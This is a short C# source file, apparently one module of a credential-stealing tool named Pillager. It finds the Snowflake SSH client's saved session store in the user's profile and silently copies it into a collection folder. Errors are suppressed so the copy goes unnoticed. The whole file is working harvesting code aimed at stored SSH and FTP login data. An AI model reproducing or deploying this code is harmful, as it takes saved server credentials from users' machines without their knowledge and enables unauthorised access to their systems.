using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Pillager.FTPs
{
    internal class Snowflake
    {
        public static string FTPName = "Snowflake";

        public static void Save(string path)
        {
            try
            {
                string jsonpath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "snowflake-ssh\\session-store.json");
                if (File.Exists(jsonpath))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.Copy(jsonpath, Path.Combine(savepath, "session-store.json"));
                }
            }
            catch { }
        }
    }
}
